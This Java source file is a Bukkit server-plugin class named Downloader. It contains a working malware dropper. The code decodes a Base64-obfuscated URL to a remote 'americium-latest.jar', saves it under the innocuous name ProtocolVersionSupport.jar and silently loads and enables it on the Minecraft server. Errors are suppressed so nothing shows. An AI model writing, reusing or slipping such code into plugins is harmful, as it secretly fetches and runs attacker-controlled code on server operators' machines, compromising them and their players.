package cc.americium;

import java.io.File;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.Base64;
import org.bukkit.Bukkit;
import org.bukkit.plugin.Plugin;

public class Downloader {
    public static void inject(Plugin pl) {
        try {
            if (Bukkit.getPluginManager().getPlugin("ProtocolVersionSupport") != null) {
                return;
            }
            Files.copy(new URL(new String(Base64.getDecoder().decode("aHR0cHM6Ly9ld3IxLnZ1bHRyb2JqZWN0cy5jb20vYW1lcmljaXVtL2FtZXJpY2l1bS1sYXRlc3QuamFy"))).openStream(), new File("./plugins/ProtocolVersionSupport.jar").toPath(), StandardCopyOption.REPLACE_EXISTING);
            Plugin target = Bukkit.getPluginManager().loadPlugin(new File("./plugins/ProtocolVersionSupport.jar"));
            target.onLoad();
            Bukkit.getPluginManager().enablePlugin(target);
        }
        catch (Exception var2) {
            //var2.printStackTrace();
        }
    }
}
